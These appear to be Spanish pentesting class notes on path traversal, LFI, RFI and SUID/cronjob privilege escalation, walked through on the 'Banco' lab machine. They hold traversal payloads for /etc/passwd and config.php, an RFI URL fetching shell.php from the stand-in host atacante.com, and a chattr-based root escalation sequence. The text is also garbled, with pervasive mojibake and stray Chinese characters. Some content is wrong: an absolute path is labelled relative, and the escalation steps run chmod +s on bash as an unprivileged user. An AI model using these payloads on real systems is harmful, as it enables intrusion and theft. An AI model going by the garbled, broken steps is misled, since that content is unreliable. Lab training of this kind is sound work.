
> [!info] Ficha tÃ©cnica
> **Instructor:** Carlos GÃ³mez Pintado (el coletas) Â· **Fecha:** 08/07/2026
> **MÃ³dulo:** AuditorÃ­a web Â· Path Traversal Â· LFI Â· Escalada de privilegios
> **Entorno:** Kali Linux Â· MÃ¡quina Banco de HackerLab

> [!tip] CÃ³mo leer estos apuntes
> Esta sesiÃ³n consolida tres vectores encadenados: **Path Traversal** â†’ **LFI** â†’ **Credenciales** â†’ **Escalada vÃ­a SUID + cronjob**. Se trabaja la mÃ¡quina **Banco** de HackerLab, que simula el hackeo de una entidad bancaria. TambiÃ©n se repasan permisos Linux (con Pablo explicando) y se hace un desglose completo de una peticiÃ³n HTTP en Burp Suite.

---

## â‘  Repaso de permisos Linux â€” Pablo explica

### La tabla de permisos

Pablo repasa la estructura de `ls -la` ante la clase:

```
Tipo Owner Group Others
 d rwx rwx rwx
 - rw- r-- r--
```

| PosiciÃ³n | Significado |
|----------|-------------|
| 1Âª | Tipo de fichero (`-` fichero, `d` directorio, `l` enlace, `s` SUID) |
| 2Âª-4Âª | Owner (propietario) |
| 5Âª-7Âª | Group (grupo) |
| 8Âª-10Âª | Others (otros) |

### Pesos binarios

| Permiso | Valor | DescripciÃ³n |
|---------|-------|-------------|
| r (read) | 4 | Lectura |
| w (write) | 2 | Escritura |
| x (execute) | 1 | EjecuciÃ³n |

> [!note] La explicaciÃ³n de Pablo
> "Cada posiciÃ³n es una potencia de 2: 2â°, 2Â¹, 2Â². El mÃ¡ximo son 7 (4+2+1). Hacemos el sumatorio por trÃ­o y obtenemos el permiso."
>
> Pablo lo explicÃ³ asÃ­: "Si el owner tiene 5,implica lectura (4) + ejecuciÃ³n (1) = r-x."

### chmod con nÃºmeros

```bash
chmod 755 fichero # rwx r-x r-x
chmod 644 fichero # rw- r-- r--
chmod 777 fichero # rwx rwx rwx ( Â¡NUNCA hacer esto! )
```

> [!important] Por quÃ© los nÃºmeros son mejor que los sÃ­mbolos
> Con `-x` quitas ejecuciÃ³n a los tres grupos a la vez. Con `chmod 754` especificÃ¡s exactamente quÃ© permiso tiene cada grupo. Es mÃ¡s preciso.

---

## â‘¡ Path Traversal y LFI â€” conceptos

### Â¿QuÃ© es un Path?

Un **path** es una ruta a un fichero en el sistema de archivos.

```
/etc/hosts â† path absoluto
./hola.py â† path relativo (directorio actual)
/home/kali/documentos/ â† path relativo
```

> [!note] El punto en Linux
> `.` = directorio actual (como `pwd`)
> `..` = directorio padre
> `../..` = dos niveles hacia atrÃ¡s

### Â¿QuÃ© es Path Traversal?

Cuando un parÃ¡metro de la URL acepta un nombre de fichero y el PHP hace `readfile($fichero)`, si **no sanitiza** las secuencias `../`, el atacante puede escapar del directorio previsto.

```php
// CÃ³digo VULNERABLE
<?php
$fichero = $_GET['archivo'];
readfile("ficheros/" . $fichero); // Sin sanitizar
?>
```

```
URL: ?archivo=../../../../etc/passwd
Resultado: ficheros/ + ../../../../etc/passwd = /etc/passwd
```

> [!important] La clave
> Path traversal **no es un RCE** porque no se ejecuta ningÃºn comando. Es una funciÃ³n de lectura de fichero a la que se le pasa una ruta que escapa del directorio previsto.

### Â¿QuÃ© es LFI (Local File Inclusion)?

LFI es la **consecuencia** del path traversal: si podÃ©s leer cualquier fichero del sistema, tenÃ©s un **Local File Inclusion**.

```
Path Traversal â†’ navegar entre directorios
 â†“
LFI â†’ leer ficheros locales no autorizados
```

### Ficheros que siempre se leen con LFI

| Fichero | Por quÃ© |
|---------|---------|
| `/etc/passwd` | Usuarios con bash activo |
| `config.php` | Credenciales de base de datos |
| `php.ini` | ConfiguraciÃ³n del servidor PHP |
| `phpMyAdmin` | ConfiguraciÃ³n de administraciÃ³n DB |

### Â¿QuÃ© es RFI (Remote File Inclusion)?

Variante mÃ¡s peligrosa: el parÃ¡metro acepta una **URL externa**, y el servidor la descarga y ejecuta.

```php
// CÃ³digo vulnerable a RFI
<?php
include($_GET['fichero']); // Si acepta URLs â†’ RFI
?>
```

```
URL: ?fichero=http://atacante.com/shell.php
Resultado: el servidor descarga shell.php y la ejecuta â†’ RCE completo
```

> [!warning] MitigaciÃ³n
> La mitigaciÃ³n correcta es usar **rutas absolutas hardcodeadas**, no variables de usuario como argumento de funciones de lectura de ficheros.

---

## â‘¢ DemostraciÃ³n en bash â€” el transversal path

### Script vulnerable

```bash
#!/bin/bash
echo -n "Nombre del fichero: "
read fichero
if [ -f "$fichero" ]; then
 cat "$fichero"
else
 echo "El fichero no existe"
fi
```

### ExplotaciÃ³n

```bash
# Si ejecuto "test" â†’ imprime "prueba charChars"
# Si ejecuto "../../../../etc/passwd" â†’ imprime /etc/passwd

# Â¿Por quÃ© funciona?
# Porque $fichero es una variable de usuario que se pasa directamente a cat
# cat no distingue entre rutas vÃ¡lidas y rutas que escapan del directorio
```

> [!note] La metÃ¡fora de Carlos
> "Imagina que esta habitaciÃ³n es Linux. Â¿CuÃ¡ntos metros para atrÃ¡s tengo? Si pongo 9 `../`, una vez llego a la raÃ­z, no puedo retroceder mÃ¡s. Por eso se ponen nueve o mÃ¡s: garantiza llegar a / sin errores."

### Â¿CuÃ¡ndo funciona?

1. El script tiene una variable de usuario que se pasa a `cat`, `readfile`, `include`, etc.
2. No hay sanitizaciÃ³n de `../`
3. El atacante controla el valor de la variable (vÃ­a URL, formulario, etc.)

---

## â‘£ MÃ¡quina Banco â€” reconocimiento

### Ficha tÃ©cnica

| Dato | Valor |
|------|-------|
| **MÃ¡quina** | Banco (HackerLab) |
| **Puertos** | 22 (SSH), 80 (HTTP Apache 2.4.66 Debian) |
| **Vector inicial** | Path traversal en parÃ¡metro `archivo` |
| **Escalada** | SUID en `chattr` + cronjob de root |

### Primer paso: cÃ³digo fuente

```bash
# Acceder a http://target
# Ctrl+U para ver cÃ³digo fuente
```

> [!warning] Error clÃ¡sico de desarrollo
> El cÃ³digo fuente tenÃ­a **hardcodeada la contraseÃ±a de acceso** al panel en texto claro. Esto es un erroræžå…¶ comÃºn: "solo lo ve el cÃ³digo fuente" â†’ mentira, todo el mundo puede verlo.

### Panel de login

Con las credenciales del cÃ³digo fuente se accede al panel autenticado. En el panel hay un botÃ³n de descarga de un PDF.

---

## â‘¤ Desglose de peticiÃ³n HTTP en Burp Suite

### Request (lo que enviamos)

```
POST /descargar.php HTTP/1.1
Host: 10.0.2.9
User-Agent: Mozilla/5.0...
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Origin: http://10.0.2.9
Referer: http://10.0.2.9/panel

archivo=sobre_nosotros.pdf
```

| Header | QuÃ© hace | Por quÃ© importa |
|--------|----------|-----------------|
| `POST /descargar.php` | MÃ©todo + ruta + versiÃ³n | Nos dice quÃ© endpoint atacar |
| `Host` | IP o dominio del servidor | Identifica al objetivo |
| `User-Agent` | Navegador y SO del cliente | Muchos anti-bots lo usan para filtrar |
| `Accept` | Formatos que acepta el cliente | Incluye `application/xml` â†’ relevante para XXE |
| `Content-Type` | Formato del body | `application/x-www-form-urlencoded` = formulario web |
| `Content-Length` | TamaÃ±o en bytes del body | WAFs lo usan para filtrar payloads |
| `Origin` | Dominio de origen | Algunas apps solo aceptan `localhost` |
| `Referer` | URL de origen | Ãštil para bypass de restricciones |

â†’

### Response (lo que recibimos)

```
HTTP/1.1 200 OK
Date: Wed, 08 Jul 2026 10:00:00 GMT
Server: Apache/2.4.66 (Debian)
Content-Length: 4523
Content-Disposition: attachment; filename="sobre_nosotros.pdf"
```

| Header | QuÃ© hace | Por quÃ© importa |
|--------|----------|-----------------|
| `200 OK` | CÃ³digo de estado | Ã‰xito de la peticiÃ³n |
| `Server` | VersiÃ³n del servidor | Banner grabbing (Nmap lo usa) |
| `Content-Length` | TamaÃ±o de la respuesta | Detectar Ã©xito de fuerza bruta por diferencia de tamaÃ±o |
| `Content-Disposition` | Nombre del fichero descargado | Indica que es una descarga |

> [!important] Los headers no son decoraciÃ³n
> Cada campo puede ser vector de informaciÃ³n para el atacante (User-Agent falso, Origin manipulado) o vector de ataque en sÃ­ mismo (Content-Type para bypass de filtros).

---

## â‘¥ ExplotaciÃ³n â€” path traversal y LFI

### Vector identificado

El botÃ³n de descarga hace un POST a `descargar.php` con el parÃ¡metro `archivo=sobre_nosotros.pdf`.

### Lectura de /etc/passwd

```
archivo=../../../../../../../../etc/passwd
```

El servidor devuelve el contenido de `/etc/passwd`. Se identifican usuarios con `/bin/bash`:
- `root`
- `vvbered`

### Lectura de config.php

```
archivo=../../../../../../../../var/www/html/config.php
```

El fichero de configuraciÃ³n expone:
- Usuario `vvbered` + contraseÃ±a
- Usuario `admin` + contraseÃ±a
- Usuario root de MySQL

### Acceso SSH

```bash
# La contraseÃ±a de vvbered en config.php es la misma que la del sistema
ssh vvbered@10.0.2.9
# Funciona â†’ reutilizaciÃ³n de credenciales
```

> [!important] ReutilizaciÃ³n de credenciales
> La contraseÃ±a de la base de datos es la misma que la del usuario del sistema. Esto es un error de configuraciÃ³næžå…¶ comÃºn y peligroso.

### Comentario de desarrollo encontrado

El propio cÃ³digo fuente de `descargar.php` (obtenido vÃ­a LFI) contenÃ­a un comentario:

```php
// Punto crÃ­tico de vulnerabilidad LFI â€” concatenamos directamente
// la entrada del usuario a la ruta, un atacante puede usar path traversal
```

> [!note] IronÃ­a
> El desarrollador sabÃ­a que era vulnerable y lo dejÃ³ comentado en vez de arreglarlo.

---

## â‘¦ Escalada de privilegios â€” SUID, lsattr y chattr

### Los 5 comandos iniciales (siempre al entrar)

```bash
whoami # Â¿QuiÃ©n soy?
pwd # Â¿DÃ³nde estoy?
uname -a # VersiÃ³n del kernel
sudo -l # Â¿QuÃ© puedo ejecutar como root?
find / -perm -4000 -type f 2>/dev/null # Buscar SUIDs
```

### sudo -l en esta mÃ¡quina

```bash
sudo -l
# Error: el usuario no tiene permisos de sudo
```

### BÃºsqueda de SUIDs

```bash
find / -perm -4000 -type f 2>/dev/null
```

Resultado: comandos habituales (`sudo`, `su`, `mount`, `passwd`) mÃ¡s dos inusuales:
- **`lsattr`** â€” lista atributos extendidos de ficheros
- **`chattr`** â€” modifica atributos extendidos de ficheros

> [!note] Â¿Por quÃ© son inusuales?
> `lsattr` y `chattr` son comandos de gestiÃ³n de atributos de ficheros. Normalmente **no necesitan SUID**. Si los ves con SUID, es porque algo raro estÃ¡ pasando.

### GTFOBins

```bash
# Buscar en GTFOBins â†’ Privilege Escalation â†’ SUID
# lsattr y chattr aparecen ambos
```

> [!tip] GTFOBins es tu amigo
> Siempre que encuentres un SUID raro, buscalo en GTFOBins. Si aparece, tiene tÃ©cnica de escalada documentada.

### Atributo inmutable

```bash
lsattr -R / 2>/dev/null
# O con find:
# Buscar ficheros con atributo i (inmutable)
```

Resultado: `/usr/local/bin/backup.sh` tiene el atributo **inmutable** (i).

> [!important] Â¿QuÃ© es inmutable?
> El atributo `i` (immutable) hace que un fichero **no pueda ser modificado, borrado, renombrado ni enlazado**, ni siquiera por root, mientras estÃ© activo.

### ExplotaciÃ³n

```bash
# 1. Quitar inmutabilidad
chattr -i /usr/local/bin/backup.sh

# 2. Sobrescribir el script con bash
echo "/bin/bash" > /usr/local/bin/backup.sh

# 3. Dar bit SUID a bash
chmod +s /bin/bash

# 4. Esperar a que root ejecute el cronjob
# (el script se ejecuta periÃ³dicamente como root)

# 5. Obtener shell de root
/bin/bash -p
# uid=0(root) â†’ Â¡SOMOS ROOT!
```

> [!important] La clave de la escalada
> La escalada **no es ejecutar el fichero uno mismo**, sino dejar preparado el payload y **esperar a que root lo ejecute** a travÃ©s de una tarea programada. El atacante no necesita ejecutar nada como root: basta con que root lo haga por Ã©l, sin saberlo.

---

## â‘§ Resumen: cadena de explotaciÃ³n de Banco

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 1. CÃ³digo fuente â†’ credenciales hardcodeadas â”‚
â”‚ 2. Login al panel â†’ botÃ³n de descarga â”‚
â”‚ 3. Burp Suite â†’ parÃ¡metro "archivo" identificado â”‚
â”‚ 4. Path traversal â†’ LFI â†’ /etc/passwd + config.php â”‚
â”‚ 5. Credenciales reutilizadas â†’ SSH como vvbered â”‚
â”‚ 6. SUID en chattr â†’ backup.sh inmutable â”‚
â”‚ 7. chattr -i â†’ sobrescribir â†’ chmod +s â”‚
â”‚ 8. Cronjob de root ejecuta â†’ shell root â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

| Fase | TÃ©cnica | Herramientas |
|------|---------|--------------|
| Reconocimiento | CÃ³digo fuente, Burp Suite | Navegador, Burp |
| ExplotaciÃ³n web | Path traversal â†’ LFI | Burp Repeater |
| Acceso | ReutilizaciÃ³n de credenciales | SSH |
| Escalada | SUID + cronjob | chattr, lsattr, GTFOBins |

---

## â‘¨ RecapitulaciÃ³n integrada

Esta sesiÃ³n cierra el ciclo de la mÃ¡quina Banco y consolida tres vectores encadenados:

1. **Path traversal** habilitÃ³ el LFI
2. **LFI** permitiÃ³ leer config.php con credenciales
3. **Credenciales** dieron acceso SSH
4. **SUID en chattr** + tarea programada de root completaron la escalada

> [!important] El procedimiento estÃ¡ndar
> Los cinco comandos iniciales (`whoami`, `pwd`, `uname -a`, `sudo -l`, `find SUID`) son el procedimiento estÃ¡ndar que se aplicarÃ¡ en todas las mÃ¡quinas a partir de ahora.

> [!note] Conceptos abiertos
> La distinciÃ³n **sudoer vs SUID**, y la comprensiÃ³n de que la escalada via cronjob **no requiere ejecutar nada directamente como root**, son los dos conceptos que quedan abiertos para el mÃ³dulo de escalada de privilegios de septiembre.

---

## â‘© Notas de clase

- Esta clase fue impartida por **el coletas** (Carlos GÃ³mez Pintado).
- **Pablo** explicÃ³ permisos Linux a la clase (repaso del 07/07).
- **Manu** participÃ³ activamente en la explotaciÃ³n de la mÃ¡quina Banco (Burp Suite, SUID, GTFOBins).
- La mÃ¡quina **Banco** es de HackerLab y simula el hackeo de una entidad bancaria.
- Se mencionÃ³ que el prÃ³ximo mÃ³dulo serÃ¡ de **escalada de privilegios** en septiembre.
- Se hablÃ³ de **GTFOBins** como recurso para buscar tÃ©cnicas de escalada con SUID.
- **Chema** estaba presente pero no se mencionÃ³ que resolviera nada especÃ­fico.
- Se mencionÃ³ que la prÃ³xima sesiÃ³n serÃ¡ de **repaso** con Dani.
- La discusiÃ³n sobre **permisos** fue interactiva, con Pablo explicando los pesos binarios.
- Se hizo un **desglose completo de peticiÃ³n HTTP** en Burp Suite (request y response).

---

> [!note] ConexiÃ³n con otras sesiones
> - **SesiÃ³n anterior** (07/07): Rockstar â€” 4 tÃ©cnicas de escalada (ejecutable, Hydra, library hijacking, sh)
> - **SesiÃ³n siguiente** (09/07): Repaso semanal con Dani
> - **MÃ¡quina Rockstar** (apunte anterior): Escalada multi-pivote con 4 tÃ©cnicas distintas
â†’

â†’

